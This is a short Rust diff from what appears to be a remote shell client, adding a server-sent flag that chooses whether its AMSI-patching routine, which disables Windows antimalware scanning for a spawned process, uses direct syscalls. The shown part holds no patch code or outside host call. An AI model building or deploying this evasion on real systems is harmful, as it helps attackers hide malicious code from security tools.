@@ -314,17 +314,30 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                 .expect("Failed to start process");
 
             let amsi_value = String::from_utf8_lossy(&buff)
-                .splitn(2, ':')
+                .splitn(3, ':')
                 .nth(1)
                 .unwrap_or("N")
                 .trim_end_matches('\0')
                 .to_owned();
+            println!("{}", amsi_value);
             if amsi_value
                 .trim_end_matches('\0')
                 .trim_end()
                 .eq_ignore_ascii_case("Y")
             {
-                patch_amsi(child.id());
+                let syscalls_value = String::from_utf8_lossy(&buff)
+                    .splitn(3, ':')
+                    .nth(2)
+                    .unwrap_or("N")
+                    .trim_end_matches('\0')
+                    .to_owned();
+                println!("{}", syscalls_value);
+                let syscalls_bool = match syscalls_value.trim_end_matches('\0').trim_end() {
+                    "Y" => true,
+                    "N" => false,
+                    _ => false,
+                };
+                patch_amsi(child.id(), syscalls_bool);
             }
 
             // Start process thread with in/out pipes
